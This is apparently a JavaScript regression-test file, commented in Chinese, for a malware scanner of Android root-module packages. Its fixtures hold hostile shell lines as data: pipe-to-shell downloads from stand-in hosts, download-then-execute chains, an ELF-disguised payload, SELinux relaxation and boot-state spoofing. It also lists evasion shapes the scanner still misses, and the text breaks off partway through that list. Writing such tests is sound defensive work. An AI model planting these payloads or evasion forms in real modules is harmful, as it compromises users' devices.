// Task 7 常驻三张表：拦得住的 / 仍漏着的 / 只影响呈现的（工单 briefs/task-7.md §2）
//
// 这个文件不修任何判据，也不新增判据。它只做一件事：把过去两轮靠「一次性变异」才证明得到的
// 东西，变成仓库里天天跑的夹具。三张表的分工：
//
//   REGRESSION          —— 今天拦得住的形状。谁把某条规则摘掉，对应那一行就红。
//   KNOWN_MISS          —— 今天仍拦不住（或按用户口径故意不拦）的形状。断的是**它今天的实际结论**：
//                          今天绿；谁把那个洞补上，这一条就红 —— 红是安全的方向，它逼着改的人
//                          把条目从这张表挪进上一张表，而不是让一个漏检继续匿名存在。
//   NARROWING_WITNESSES —— 每一处收窄/降级/豁免都有一条常驻的「它没有溢出」证人。
//                          A1 那轮实测到「豁免呈现滑成豁免扫描」这个方向，仓库里**所有**旧夹具在
//                          变异 M5 下 fail=0 全绿（task-a1-report.md §六.5）；本轮把它变成夹具。
//
// 机制订正（工单 §1）：计划 Task 7 原文那句「4 条漏检在 T1–T4 做完之前必须红」的对象已经消失，
// 而 `node --test` 下「常驻红」不可行（failing-todo 与 passing-todo 都不改 exit code，todo 只能当
// 清单、当不了闸）。⇒ 本文件的牙 = 特征化断言 + 清单不变量，两个方向都有牙：
// 补上洞 ⇒ 对应条目红；删条目 ⇒ 清单不变量红。
//
// 期望值的来源 = **先跑后写**（工单 §4 步 2）。每一条形状先用一次性脚本量出今天的结论，再把观测值
// 贴进来；注释里写的是实测值，不是从工单措辞或记忆里推出来的。基线：副本 `d022f0a`，裸跑 504/503/0/1。
// 与工单 §2 那张残账清单**不一致**的条目（KM-1 / KM-4 / KM-7）在各自注释里点名写着，报告 §三复述。
//
// 零 Temp 依赖：夹具全部 `makeModuleZip` 现造。历史上那 13/18 包真语料的表**不在这里**，
// 也不该在这里 —— 语料已被系统清掉，凡是依赖它的结论都只能按「上一轮实测、本轮未复现」引用。
// 这里能常驻的部分（逐字行 + 整包结论）已经常驻。
//
// 断言口径（计划 Task 7 §Step 原文 + 工单 §2）：只读 riskLevel / decision.action / findings 的
// ruleId+severity+落点，**不锁 findings 总数** —— 锁总数会让以后每加一条规则都来改这张表。

import test from 'node:test';
import assert from 'node:assert/strict';

import {
  RULES_BY_ID, countsTowardRisk, printableRatio, POLYGLOT_MIN_PRINTABLE, scoreRisk, decide,
  MALICE_RULE_IDS,
} from './risk-rules.mjs';
import { classify, readZip } from './scan.mjs';
import { makeModuleZip, scanToReport } from './fixtures.mjs';

// ---------------------------------------------------------------------------
// 夹具词汇表（都是本文件私有的小工具，不改 scan.mjs / risk-rules.mjs 一个字）
// ---------------------------------------------------------------------------

const SHE = '#!/system/bin/sh';
/** 带 shebang 的脚本正文（行号从 1 开始，第 1 行是 shebang ⇒ 载荷从第 2 行起）。 */
const body = (...lines) => [SHE, ...lines].join('\n') + '\n';
/** A1 那一格用到的两个逐字常量（与 risk-rules 的导出同一串，写在夹具里是为了让形状自解释）。 */
const UB = 'META-INF/com/google/android/update-binary';
const UB_TPL = '#!/system/bin/sh\n[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh\n';
/**
 * 「伪装成数据文件的载荷」：ELF 魔数 + pad 个 NUL + 一段明文脚本。
 * `pad` 决定哪条通道接住它：0 ⇒ Task 4 的可打印比例过 0.85（进 feed）；
 * 400 ⇒ 压在阈值之下，只能靠引用升级进面（A1-N6(b) 那一格的前提）。
 *
 * 为什么住在**这个文件**里而不是 `fixtures.mjs`：工单允许往 fixtures.mjs **新增** helper，
 * 但 `scan.test.mjs` 的 A1-N6 与 T4 两处已经把同一串字节**内联**写过了，而那些夹具本轮禁改
 * ⇒ 搬进 fixtures.mjs 只会得到「同一份字节两处各写一份」的第二套口径（P10/A1 两轮都栽在
 * 「两套口径互相顶着、变异谁都不红」上）。等下一轮被授权把这两处收编时再搬，才是单一实现点。
 */
function disguisedPayload(text, { pad = 400 } = {}) {
  return Buffer.concat([
    Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]),
    Buffer.alloc(pad, 0),
    Buffer.from(String(text), 'utf8'),
  ]);
}
/** Task 4 那一格的伪装载荷：魔数 + 明文 ⇒ 可打印比例过 0.85，走 polyglot 那条通道。 */
const POLYGLOT = disguisedPayload(
  '#!/system/bin/sh\ncurl -s https://abc.cc/x.sh | sh\n', { pad: 0 });
/** A1-N6(b) 那一格：魔数 + 400 个 NUL + 同一段明文 ⇒ 比例过不了 0.85，只能靠引用升级进面。 */
const DISGUISED = disguisedPayload(
  '#!/system/bin/sh\ncurl -s https://abc.cc/x.sh | sh\n');

/** 整包跑一遍（changeType 显式给 'first'，否则 decide 走 unknown ⇒ 见 fixtures.mjs 头部那段契约）。 */
async function run(row) {
  const zip = makeModuleZip(row.build());
  return scanToReport(zip, { changeType: 'first' });
}
/** 「ruleId/severity@file:line」多重集合（排序，可比对，也方便红的时候直接读出落点）。 */
const spots = (r) => r.findings.map((f) => `${f.ruleId}/${f.severity}@${f.file}:${f.line}`).sort();
/** 某一条规则在报告里的落点（不锁总数，只锁「这一条说什么、说在第几行、说什么档」）。 */
const spotOf = (r, ruleId) => r.findings.filter((f) => f.ruleId === ruleId)
  .map((f) => `${f.severity}@${f.file}:${f.line}`).sort();
/** 报告里出现过的规则名集合（去重、排序）。 */
const ruleIds = (r) => [...new Set(r.findings.map((f) => f.ruleId))].sort();
/** 记账两本账的收据串。 */
const escalatedOf = (r) => r.escalated.map((e) => `${e.fromFile}:${e.fromLine}->${e.resolvedEntry}`).sort();
const revokedOf = (r) => r.revokedBundledRefs.map((e) => `${e.ruleId}@${e.file}:${e.line}->${e.resolvedEntry}`).sort();
/** 规则级探针：这一条规则对这段文本到底说没说、说在第几行（返回 finding 本体，档位与落点都可读）。 */
function probe(ruleId, file, text) {
  return RULES_BY_ID[ruleId].scan(file, text).filter((f) => f.severity != null);
}
const probeRead = (list) => list.map((f) => `${f.severity}@${f.line}`).sort();

// ---------------------------------------------------------------------------
// 两轴读数的公共尺子（2026-10-21 换轴接线之后）
// ---------------------------------------------------------------------------
const MALICE_SET = new Set(MALICE_RULE_IDS);
/** 一份形状里「名单成员在说话」的那几条（就是拦它的那件事，不是等级）。 */
const listedIn = (row) => [...new Set(row.expectSpots.map((s) => s.split('/')[0]).filter((id) => MALICE_SET.has(id)))].sort();
/** 标注里点到的所有规则名（三格并起来看：能力 / 覆盖 / 上下文题）。 */
const annotated = (r) => [...new Set([
  ...(r.annotation?.capabilities || []),
  ...(r.annotation?.coverageGaps || []),
  ...(r.annotation?.contextQuestions || []),
])];
/**
 * 一行表 = 一个声明（row.axis）+ 一次复算（名单自己）。两者一漂就红，这才是这张表换轴之后的牙：
 *   以前有人把规则摘掉 ⇒ expectSpots 红；现在**还有人**把它偷偷进/退名单 ⇒ 这里红。
 * 降档那一侧的验收形状是 §3.2 ② 那句「不许静默」：不上架了，读数还必须在 annotation 里点名。
 */
function assertAxis(row, r) {
  assert.ok(row.axis === 'malice' || row.axis === 'annotation',
    `${row.id} 缺 axis 这一格（'malice' | 'annotation'）：换轴之后每张表都要说自己站在哪根轴上`);
  const listed = listedIn(row);
  const derived = listed.length ? 'malice' : 'annotation';
  assert.equal(row.axis, derived,
    `${row.id} 声明的是 ${row.axis}，但真名单在这一发上说 ${derived ? 'malice' : 'annotation'}`
    + `（名单成员：${JSON.stringify(listed)}；实测 ruleIds=${JSON.stringify(ruleIds(r))}）。`
    + ' 有人把规则进/退了拦截名单 ⇒ 定案表要重新过一轮，不许只改名单不改表。');
  if (row.axis === 'malice') {
    assert.equal(r.malice.malicious, true,
      `${row.id} 命中名单却说没命中：判据与名单漂了 ${JSON.stringify(r.malice.hits)}`);
    assert.equal(r.decision.action, 'block',
      `${row.id}：${JSON.stringify(listed)} 在名单里，就必须不上架（实测 ${r.riskLevel}/${r.decision.action}）`);
    for (const id of listed) {
      assert.ok(r.malice.hits.some((h) => h.source === 'static' && h.ruleId === id),
        `${row.id}：拦它的应当点名是 ${id}，实际 hits=${JSON.stringify(r.malice.hits.map((h) => h.ruleId))}`);
    }
  } else {
    assert.equal(r.malice.malicious, false,
      `${row.id} 是名单外的形状（正当功能/假阳性），却被判成命中：${JSON.stringify(r.malice.hits)}`);
    const ann = annotated(r);
    for (const spot of row.expectSpots) {
      const id = spot.split('/')[0];
      assert.ok(ann.includes(id),
        `${row.id}：${id} 不再拦上架之后必须**还在标注里点名**（§10「不许静默」）；annotation=${JSON.stringify(r.annotation)}`);
    }
  }
  return { listed };
}

// ---------------------------------------------------------------------------
// 表一 REGRESSION —— 今天拦得住的
// 每行两个字段是硬的：
//   expectSpots —— 这一行必须由**哪条规则**说话（V3 变异「摘掉规则」时红在这里，
//                  而不是靠整包等级侥幸 —— 整包等级会被兄弟规则顶住，那正是 P10/A1 两轮
//                  「有夹具≠有独占夹具」的病）；
//   action      —— 工单 §2 的口径：断 decision.action !== 'auto-approve'。
// ---------------------------------------------------------------------------

const REGRESSION = [
  {
    id: 'REG-01',
    name: '载荷放名单外文件 + 一行执行（计划 §0 表第 7 行，T1 + T2.7）',
    // 改前那一格是 low/auto-approve：名单外条目一行都不读，而没有任何规则问「这行 sh <路径>
    // 执行的是不是包里带来的那个文件」。T1 收 EXEC_BUNDLED_FILE，T2.7 把名单外文本读进面。
    closesWhen: 'EXEC_BUNDLED_FILE 不再认这条绝对安装路径，或 conf.json 不再被读进内容扫描面',
    build: () => ({ id: 'eval.t7reg01', files: [
      ['service.sh', body('sh /data/adb/modules/eval.t7reg01/conf.json')],
      ['conf.json', body('curl -s https://evil.dev/x | sh')],
    ]}),
    expectSpots: ['EXEC_BUNDLED_FILE/high@service.sh:2', 'PIPE_TO_SHELL/high@conf.json:2'],
    measured: 'high / block',
    axis: 'malice', // PIPE_TO_SHELL 在名单里 ⇒ 拦它的不是等级
  },
  {
    id: 'REG-02',
    name: 'sepolicy.rule 里的 allow su（计划 §0 表第 8 行，T2）',
    // 改前 low/auto-approve：策略文件不是脚本，行级规则一个字节都没喂进去。T2 补的是
    // 「内容本身就是可执行语义」那一格（POLICY_BASENAMES/POLICY_EXTS + SELINUX_POLICY_RELAX）。
    closesWhen: 'sepolicy.rule 不再进扫描面，或 SELINUX_POLICY_RELAX 不再认 allow su 这一族',
    build: () => ({ id: 'eval.t7reg02', files: [
      ['sepolicy.rule', 'allow su * fs:file { read write open execute }\n'],
    ]}),
    expectSpots: ['SELINUX_POLICY_RELAX/high@sepolicy.rule:1'],
    measured: 'high / auto-approve（2026-10-21 换轴实测；换轴前是「high / block」）—— §3.1 量出来会翻档的两发之一：'
      + '这一发的唯一证人是 SELINUX_POLICY_RELAX，而 §13.6 拍的是「降档 + 给 AI 一道上下文题」'
      + '⇒ 它今天进 annotation.contextQuestions，不再进拦截名单。等级照旧 high、读数照旧在报告面上。',
    axis: 'annotation',
  },
  {
    id: 'REG-03',
    name: 'magiskpolicy --live + resetprop ro.boot.*（计划 §0 表第 9 行，T2）',
    // 三条各由自己的规则说话：热更策略、伪装校验位、放开可调试。逐字取自 §0 那一行的三个写法。
    closesWhen: 'MAGISK_POLICY_LIVE / VERIFIED_BOOT_SPOOF / PROP_BOOT_SPOOF 任一支不再认这一族写法',
    build: () => ({ id: 'eval.t7reg03', files: [
      ['service.sh', body(
        'magiskpolicy --live "allow su * *"',
        'resetprop -w ro.boot.verifiedbootstate green',
        'resetprop ro.debuggable 1')],
    ]}),
    expectSpots: ['MAGISK_POLICY_LIVE/high@service.sh:2', 'VERIFIED_BOOT_SPOOF/high@service.sh:3',
      'DEBUGGABLE_ENABLE/medium@service.sh:4'],
    measured: 'high / auto-approve（2026-10-21 换轴实测；换轴前是「high / block」）—— §3.1 的另一发：'
      + '说话的是 MAGISK_POLICY_LIVE / VERIFIED_BOOT_SPOOF / DEBUGGABLE_ENABLE，三条都不在名单里'
      + '（§13.6 拍：前两条降档进上下文题，member 表按 §3.2 ② 补齐）。'
      + '§3.1 那句「同一条规则不能既属拦截轴又属能力轴」就是这一发量出来的。',
    axis: 'annotation',
  },
  {
    id: 'REG-04',
    name: '两阶段下载-执行，域名是普通域名（计划 §0 表第 10 行，T3）',
    // 改前 low/auto-approve，而且 §0 已经写明：那一格变成 block 靠的是 HARDCODED_IP 侥幸，
    // 不是靠这条链 ⇒ 这里的域名**故意**不是裸 IP、不是可疑 TLD，只有链本身能说话。
    closesWhen: 'DOWNLOAD_THEN_EXEC 的 sink 或执行位判据被摘掉（V3c 摘的就是这一条）',
    build: () => ({ id: 'eval.t7reg04', files: [
      ['service.sh', body(
        'curl http://update.example.com/u -o /data/local/tmp/u',
        'chmod 700 /data/local/tmp/u',
        '/data/local/tmp/u &')],
    ]}),
    expectSpots: ['DOWNLOAD_THEN_EXEC/high@service.sh:4'],
    measured: 'high / block（NETWORK_FETCH/low 只是背景噪声）',
    axis: 'malice',
  },
  {
    id: 'REG-05',
    name: '改名 ELF 被引用（T1：classify 让魔数赢过后缀 + 引用升级进面）',
    // 载荷改名成 .dat 落在 binaries 桶，靠 customize.sh 那一行被升级进扫描面；
    // 「登记为二进制」与「逐行读过它」是两本账，两本都要响。
    closesWhen: 'resolveBundledRefs 不再解析 sh $MODPATH/... 这一支，或 detectBinary 不再认 ELF 魔数',
    build: () => ({ id: 'eval.t7reg05', files: [
      ['customize.sh', body('sh $MODPATH/assets/tool.dat')],
      ['assets/tool.dat', DISGUISED],
    ]}),
    expectSpots: ['EXEC_BUNDLED_FILE/high@customize.sh:2', 'STRUCT_BINARY/medium@assets/tool.dat:0',
      'PIPE_TO_SHELL/high@assets/tool.dat:2'],
    extra: (r) => {
      assert.deepEqual(escalatedOf(r), ['customize.sh:2->assets/tool.dat'],
        '被引用的伪装条目必须靠这笔账进面：' + JSON.stringify(r.escalated));
      assert.deepEqual(r.polyglotFed.map((e) => e.name), [],
        'NUL 填充把它压在阈值之下 ⇒ polyglot 通道不许接住它（这一格只能由引用解析负责）');
    },
    measured: 'high / block',
    axis: 'malice', // PIPE_TO_SHELL 在名单里（§3.1 那句「REG-05 仍被拦只是因为明文带 curl|sh」）
  },
  {
    id: 'REG-06',
    name: 'curl -o 落盘再执行（T3 教科书写法）',
    closesWhen: 'DOWNLOAD_THEN_EXEC 不再认 -o，或执行行不再被认成执行',
    build: () => ({ id: 'eval.t7reg06', files: [
      ['service.sh', body('curl -o "$MODPATH/stage2.sh" https://x.dev/a', 'sh "$MODPATH/stage2.sh"')],
    ]}),
    // 两条都要：EXEC_BUNDLED_FILE 说「执行的是模块自带条目」，DOWNLOAD_THEN_EXEC 说「那个条目是远程落下来的」。
    expectSpots: ['DOWNLOAD_THEN_EXEC/high@service.sh:3', 'EXEC_BUNDLED_FILE/high@service.sh:3'],
    measured: 'high / block',
    axis: 'malice',
  },
  {
    id: 'REG-07',
    name: '融合短选项簇 + 命令位末段是自带二进制（T3.1，逐字 microG customize.sh:17/27）',
    // 计划 §0.18 的实测：sink 只认 `-o/-O` 单独成词时，13 个真包里 0/13 命中；
    // 真脚本写的是 `$curl -o ...`（curl 是指向包内二进制的变量）与 `-qO` / `-sLo`。
    closesWhen: 'dteGroups / 下载器识别不再认「解析变量后末段是 curl」那一格',
    build: () => ({ id: 'eval.t7reg07', files: [
      ['customize.sh', body(
        '    curl=$MODPATH/tools/curl/arm64eabi-v7a/curl',
        '$curl -o "$MODPATH/system/priv-app/microGServicesCore/base.apk" -k "https://microg.org/fdroid/repo/com.google.android.gms-231657056.apk"',
        'sh "$MODPATH/system/priv-app/microGServicesCore/base.apk"')],
    ]}),
    expectSpots: ['DOWNLOAD_THEN_EXEC/high@customize.sh:4', 'EXEC_BUNDLED_FILE/high@customize.sh:4'],
    measured: 'high / block',
    axis: 'malice',
  },
  {
    id: 'REG-08',
    name: '控制词站在命令位上的管道（T3.2/T3.3：if wget -qO- … | sh）',
    // 计划 §0.19：`if curl … | sh; then` 是装机脚本里最常见的写法，旧左边界不认「控制词 + 空格」，
    // 七形里四形当时是 low/auto-approve。
    closesWhen: 'SHELL_STATEMENT_START 那一支从左边界里被摘掉（命令位不再穿透控制词）',
    build: () => ({ id: 'eval.t7reg08', files: [
      ['service.sh', body('if wget -qO- https://x.dev/a | sh; then', '  :', 'fi')],
    ]}),
    expectSpots: ['PIPE_TO_SHELL/high@service.sh:2'],
    measured: 'high / block',
    axis: 'malice',
  },
  {
    id: 'REG-09',
    name: '真包逐字的落盘-执行链（T3.2，sensitive-props customize.sh 207/208/215/216）',
    // 融合簇 + 续行 + 行首 `if` 三件事叠在同一段原文上：这一格是「挡住真链的从来不是写法，
    // 是行首那个 if」那句话的实物。
    closesWhen: '跨行分组（buildLineContexts 的 logicalLine）不再把续行折成一个逻辑行',
    build: () => ({ id: 'eval.t7reg09', files: [
      ['customize.sh', body(
        '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
        '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
        '      chmod 755 "$MODPATH/resetprop-rs"',
        '      if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then')],
    ]}),
    expectSpots: ['DOWNLOAD_THEN_EXEC/high@customize.sh:5'],
    measured: 'high / block',
    axis: 'malice',
  },
  {
    id: 'REG-10',
    name: '缩进裸写的管道（T3.4，逐字 entware installer customize.sh:142）',
    // 计划 §0.20：行首 4 个空格就足够逃出旧左边界 ⇒ 收缩进缩进。V3a 摘掉 `^\\s*` 时红在这一行。
    closesWhen: 'PIPE_TO_SHELL 左边界第一支的 `^\\s*` 退回 `^`（缩进裸写再次沉默）',
    build: () => ({ id: 'eval.t7reg10', files: [
      ['installer.sh', body('    wget -O - "http://bin.entware.net/$ENTWARE_ARCH/installer/generic.sh" | sh')],
    ]}),
    expectSpots: ['PIPE_TO_SHELL/high@installer.sh:2'],
    measured: 'high / block',
    axis: 'malice',
  },
  {
    id: 'REG-11',
    name: 'polyglot 进 feed（T4：改名 .bin 的 ELF + 五行明文）',
    // §0 那一格「报告从读不了变成指名道姓」：改前只有 STRUCT_BINARY/medium，
    // 改后明文那几行由**自己的行号**说话。战果不是「多拦一个包」（改前也是 block），
    // 所以这一行锁的是「内容那几条必须在」，不是整包结论。
    closesWhen: 'scanFeedBytes / polyglot 那一步不再把整块可读的 binaries 条目喂进内容扫描',
    build: () => ({ id: 'eval.t7reg11', files: [
      ['service.sh', body('echo ok')],
      ['assets/payload.bin', POLYGLOT],
    ]}),
    expectSpots: ['PIPE_TO_SHELL/high@assets/payload.bin:2', 'STRUCT_BINARY/medium@assets/payload.bin:0'],
    extra: (r) => {
      assert.deepEqual(r.polyglotFed.map((e) => e.name), ['assets/payload.bin'],
        '进过 feed 这件事必须人看得见：' + JSON.stringify(r.polyglotFed));
      assert.deepEqual(r.scripts.map((s) => s.name).filter((n) => n === 'assets/payload.bin'), [],
        '一份身份：feed 里的条目不重复出现在 scripts 清单（Task 4 §2.4）');
    },
    measured: 'high / block',
    axis: 'malice', // PIPE_TO_SHELL（明文那两行自己说话）在名单里
  },
  {
    id: 'REG-12',
    name: '载荷藏在 customize.sh 里（A1 的 D 包：官方形状豁免不许顶掉它）',
    // A1 那一格「只影响呈现」的反面：update-binary 的模板行被降成 info，
    // 但它 source 的 customize.sh 自己那一行 PIPE_TO_SHELL/high 必须照样说话。
    closesWhen: '模板行那条引用不再把 customize.sh 拉进扫描面（= 豁免溢出到扫描面，V4 的形状）',
    build: () => ({ id: 'eval.t7reg12', files: [
      [UB, UB_TPL],
      ['customize.sh', body('curl -s https://abc.cc/x.sh | sh')],
    ]}),
    expectSpots: ['PIPE_TO_SHELL/high@customize.sh:2'],
    extra: (r) => {
      assert.deepEqual(spotOf(r, 'EXEC_BUNDLED_FILE'), [],
        '模板行被撤销 ⇒ 它不该再以 high 出现在报告里：' + JSON.stringify(spots(r)));
      assert.deepEqual(revokedOf(r), [`EXEC_BUNDLED_FILE@${UB}:2->customize.sh`],
        '撤销证人必须在（这条豁免没有把记账一起关掉）');
    },
    measured: 'high / block',
    axis: 'malice', // PIPE_TO_SHELL 在名单里：豁免撤销的是 EXEC_BUNDLED_FILE，撤不掉载荷自己那一行
  },
];

// 表一的每一条：断「这一轮的那条规则确实在说话」+ 断「换轴之后它落在哪一根轴上」。
//
// ── 2026-10-21 第二发（换轴已接线）：这一张表的「拦得住」换了定义 ──────────────────────
// 旧口径是「decision.action !== 'auto-approve'」，而那个 action 吃的是**风险等级**：
// 只要包里有任何一条 high/medium 就不落自动通道。§1 第 3 条量过这件事——14 条 high 里有一批
// 匹配的就是 root 模块的正当功能本身，用它当拦截条件等于把这个生态全灭。
// 新口径（§2 / §13.5）由 `axis` 这一格声明、由下面那个函数**对MALICE_RULE_IDS复算一遍**：
//   * axis:'malice'      ⇒ 名单成员说话 ⇒ block，且 r.malice.hits 里必须点到那一条；
//   * axis:'annotation'  ⇒ 名单外 ⇒ auto-approve，但那几条读数必须**逐条**出现在 r.annotation 里
//                          （§10：标注不许静默；「降档后从读者眼前消失」是 §3.2 ② 唯一的验收形状）。
// 于是这张表的牙没有变少，反而多了一格：以前只有「规则摘掉 ⇒ 红」，现在「规则偷偷进/退名单 ⇒ 红」，
// 因为 row.axis 是人写的定案，函数拿真名单去对，两边一漂就红。
// REG-02 / REG-03 正是 §3.1 量出来会翻档的那两发（SELINUX_POLICY_RELAX、MAGISK_POLICY_LIVE/
// VERIFIED_BOOT_SPOOF 都在降档那一侧）⇒ 它们今天从 block 翻成 auto-approve，是真生效的信号。
for (const row of REGRESSION) {
  test(`T7-REG ${row.id} 拦得住：${row.name}`, async () => {
    const r = await run(row);
    assertAxis(row, r);
    for (const spot of row.expectSpots) {
      const ruleId = spot.split('/')[0];
      assert.ok(spots(r).includes(spot),
        `${row.id} 缺这一格证据：${spot} —— 实测 ${JSON.stringify(spots(r))}`);
      assert.ok(ruleIds(r).includes(ruleId), `${row.id} 报告里没有 ${ruleId}`);
    }
    if (row.extra) row.extra(r);
  });
}

// ---------------------------------------------------------------------------
// 假阳性哨兵（计划 Task 7 Step 原文那两条，工单 §2 没重述但 完成标准 里要求）
// 它们与表一方向相反：断的是「闸没有把队列淹掉」。少这一半，表一毫无价值 ——
// 任何一路放宽都不许把正经包推下去，任何一路加严都不许把它们推上人工队列。
// ---------------------------------------------------------------------------

const SENTINELS = [
  {
    id: 'SEN-01',
    name: '真正干净的模块仍可自动放行（「没把队列淹掉」的唯一证据）',
    closesWhen: 'decide 的 low+first 通道被改掉，或夹具这几行开始命中任何一条计入定级的规则',
    expect: 'auto-approve',
    build: () => ({ id: 'eval.t7sen01', files: [
      ['customize.sh', body('ui_print "- clean fixture"', 'mkdir -p $MODPATH/system/etc')],
    ]}),
    measured: 'low / auto-approve，0 findings',
  },
  {
    id: 'SEN-02',
    name: '正经去广告模块（追加 hosts）封顶在 medium：新规则不许把它抬到 high',
    // 计划 §0 表第 5 行今天仍是 medium/block（假阳性，走人工）。这一格锁的是**上限**：
    // 加严方向的任何改动都要先解释这一行。
    closesWhen: 'HOSTS_MODIFY 那一支被抬到 high，或新规则在这个形状上追加了计入定级的命中',
    expect: 'capped-medium',
    build: () => ({ id: 'eval.t7sen02', files: [
      ['customize.sh', body('cp $MODPATH/hosts.txt /data/adb/modules/$MODID/blockers.txt')],
      ['hosts.txt', '127.0.0.1 ads.example.com\n'],
    ]}),
    measured: 'medium / auto-approve（2026-10-21 换轴实测；换轴前是「medium / block（HOSTS_MODIFY/medium + HARDCODED_IP/low）」）'
      + '—— 等级一字未动，HOSTS_MODIFY/medium + HARDCODED_IP/low 两条读数都还在；变的是「medium 不再是拦截条件」。',
  },
];

for (const row of SENTINELS) {
  test(`T7-SEN ${row.id} 哨兵：${row.name}`, async () => {
    const r = await run(row);
    if (row.expect === 'auto-approve') {
      assert.equal(r.decision.action, 'auto-approve',
        `${row.id}：干净模块必须还能自动放行；实测 ${r.riskLevel}/${JSON.stringify(spots(r))}`);
      assert.deepEqual(r.findings, [], `${row.id}：夹具不该自己制造发现：${JSON.stringify(spots(r))}`);
    } else {
      assert.equal(r.riskLevel, 'medium', `${row.id} 封顶在 medium：实测 ${JSON.stringify(r.counts)}`);
      assert.ok(r.findings.some((f) => f.ruleId === 'HOSTS_MODIFY' && f.severity === 'medium'),
        `HOSTS_MODIFY 那一支必须在且是 medium：${JSON.stringify(spots(r))}`);
      // ── 2026-10-21 换轴接线的直接后果（旧期望：`notEqual(action,'auto-approve')`）──────────
      // 这一格锁的从来是**上限**（加严不许把正经去广告模块抬到 high），不是「必须走人工」；
      // 而旧写法里「走人工」是等级轴的副产品（medium ⇒ 不自动放行）。§0.2 拍掉等级轴之后
      // 副产品没了：HOSTS_MODIFY 不在拦截名单里 ⇒ 这一发上架并标注。
      // §3.1 把这件事写得很直白：「误伤不再伤人，只让报告难看」，所以去噪收窄不再是前置条件。
      // 牙没少：等级封顶照旧，且这条读数必须在标注里点名 —— 从「拦人」换成「不许静默」。
      assert.equal(r.decision.action, 'auto-approve',
        `${row.id}：名单外的 medium 现在应当上架并标注（实测 ${r.decision.action}）`);
      assert.ok(annotated(r).includes('HOSTS_MODIFY'),
        `${row.id}：降成标注不等于从读者眼前消失：annotation=${JSON.stringify(r.annotation)}`);
    }
  });
}

// ---------------------------------------------------------------------------
// 表二 KNOWN_MISS —— 今天仍拦不住 / 故意不拦的形状
//
// expect 词表（**先量后写**，与工单 §2 给的三个标签的对应关系照实写）：
//   'auto-approve'          工单词表内：整包今天落自动通道 ⇒ 断 action === 'auto-approve'。
//   'info-only'             工单词表内：证据落 info、不抬等级 ⇒ 断 severity==='info' 且仍在报告面上。
//   'not-blocked'           工单词表内：今天只走人工、没被拦住 ⇒ 断 action !== 'block'。
//                           ⚠ 本轮实测八条里**没有任何一条**落这一档（报告 §三 复述）。
//   'rule-silent-sibling-carries'   本轮新增标签：本条形状在自己的规则上 0 命中（洞确实开着），
//                           但整包被**兄弟规则**顶住 ⇒ 工单把它列在「仍拦不住」里，实测拦得住。
//   'fp-stays-medium'      本轮新增标签：反向的残留（假阳性），今天的结论是 medium/block。
// ---------------------------------------------------------------------------

const KNOWN_MISS = [
  {
    id: 'KM-1',
    name: '$DOWNLOADER：下载器住在命令替换出来的变量里（逐字 Integrity-Box common_func.sh:69 + UpdateTranslation.sh:56）',
    closesWhen: 'dteGroups 的下载器识别收「命令替换钉不住的变量」⇒ DOWNLOAD_THEN_EXEC 在这一格开始说话',
    expect: 'rule-silent-sibling-carries',
    // ⚠ 与工单 §2 的残账清单**不一致**（报告 §三第 1 条）：这一格在规则层确实还漏着
    //   （DOWNLOAD_THEN_EXEC 实测 0 命中，与 T3.1-B3 / T3.2-D3 那两条既有夹具逐字相同），
    //   但整包今天被 EXEC_INDIRECT/high（`sh "$ZIP_PATH.tmp"` 那条裸变量执行）顶住 ⇒ high/block。
    //   所以「洞还开着」是真的，「今天拦不住」不是。特征化断言按实测写：规则层 0 + 整包 block。
    probe: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'service.sh', expectCount: 0 },
    control: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'service.sh', expectCount: 1,
      text: body('ZIP_PATH="/storage/emulated/0/Download/Canary.zip"',
        '            curl -L --fail -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null',
        'sh "$ZIP_PATH.tmp"'),
      isolates: '只把命令位的 "$DOWNLOADER" 换成 curl 字面量（其余一字不动）⇒ 链立刻说话 ⇒ 沉默的原因是它' },
    build: () => ({ id: 'eval.t7km1', files: [
      ['service.sh', body(
        'URL="https://github.com/x/y/releases/download/archive/Canary.zip"',
        'OUT_DIR="/storage/emulated/0/Download/IntegrityModules"',
        'ZIP_NAME="Canary.zip"',
        'ZIP_PATH="$OUT_DIR/$ZIP_NAME"',
        '    DOWNLOADER=$(command -v curl); DL_MODE="curl"; return',
        '            "$DOWNLOADER" -L --fail --connect-timeout 15 --max-time 180 -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null',
        'sh "$ZIP_PATH.tmp"')],
    ]}),
    measured: '规则层 DOWNLOAD_THEN_EXEC=0；整包 EXEC_INDIRECT/high@8 ⇒ high / block',
  },
  {
    id: 'KM-2',
    name: 'bounded 90 "$BB" wget：下载器被包装器包住（逐字 AlwaysStrong keybox_fetch.sh:83）',
    closesWhen: '命令位识别穿过 timeout/bounded 这类包装器（= 承认谁都能把自己伪装成 wget 的代价，§0.18 明令禁止）',
    expect: 'auto-approve',
    probe: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'keybox_fetch.sh', expectCount: 0 },
    control: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'keybox_fetch.sh', expectCount: 1,
      text: body('        bb)      wget -q -T 20 -O /data/local/tmp/kb.bin "$3" 2>/dev/null ;;',
        '        sh /data/local/tmp/kb.bin ;;'),
      isolates: '只摘掉 bounded 90 "$BB" 这段包装器 ⇒ 链说话 ⇒ 沉默的原因是命令位，不是位置参数' },
    build: () => ({ id: 'eval.t7km2', files: [
      ['keybox_fetch.sh', body(
        '        bb)      [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;',
        '        sh /data/local/tmp/kb.bin ;;')],
    ]}),
    measured: 'low / auto-approve，0 findings',
  },
  {
    id: 'KM-3',
    name: '位置参数当 sink：-O "$1" 落地再 sh "$1"',
    closesWhen: 'sink 识别允许模糊匹配位置参数（计划 §0.18 那条「钉不住就不许模糊」被推翻）',
    expect: 'auto-approve',
    probe: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'fetch.sh', expectCount: 0 },
    control: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'fetch.sh', expectCount: 1,
